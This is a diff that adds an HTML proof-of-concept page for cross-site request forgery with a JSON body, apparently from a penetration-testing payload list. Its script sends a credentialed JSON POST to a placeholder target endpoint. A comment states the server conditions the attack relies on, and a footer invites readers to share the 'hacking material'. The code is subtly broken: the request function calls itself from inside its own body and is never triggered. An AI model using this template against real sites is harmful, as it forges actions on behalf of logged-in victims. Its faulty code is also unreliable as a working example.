@@ -1,0 +1,24 @@
+ <!--
+    When Application also check content-type and  body format
+    Conditions: 
+* The “Access-Control-Allow-Credential” should be true.  
+* The ACAO (Access-Control-Allow-Origin) should not be a wildcard value.
+-->
+
+<html>
+<title>hacked</title>
+<body>
+    <h1 align="center">Case-2 CSRF In JSON Exploit </h1>
+    <script>  
+        function submitRequest()  
+        {  
+        var xhr = new XMLHttpRequest();  
+        xhr.open("POST", "https:\/\/target.com\/directory_path", true);  
+        xhr.setRequestHeader("Content-Type", "application\/json");  
+        xhr.withCredentials = true;  
+        xhr.send("{\"parameter\": \"parameter_Value\"}");  
+        submitRequest();  }
+    </script>  
+    <p align="center"><b>Share the Exciting Hacking Material of Penetration-List</b></p>
+</body>
+</html>
